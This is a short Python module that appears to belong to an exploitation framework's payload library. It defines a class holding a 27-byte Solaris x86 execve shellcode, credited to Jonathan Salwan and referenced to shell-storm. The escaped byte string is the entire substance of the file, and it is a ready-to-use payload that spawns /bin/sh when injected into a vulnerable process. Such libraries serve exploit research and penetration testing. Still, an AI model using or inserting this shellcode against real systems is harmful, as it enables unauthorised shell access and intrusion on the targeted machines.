from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Jonathan Salwan"
    Shellcode.info["name"] = "Solarisx86 - execve shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-613.php"
    ]
    Shellcode.info["size"] = 27
    Shellcode.info["payload"] = [
        r"\x31\xc0\x50\x68\x6e\x2f"
        r"\x73\x68\x68\x2f\x2f\x62"
        r"\x69\x89\xe3\x50\x53\x89"
        r"\xe2\x50\x52\x53\xb0\x3b"
        r"\x50\xcd\x91"
    ]
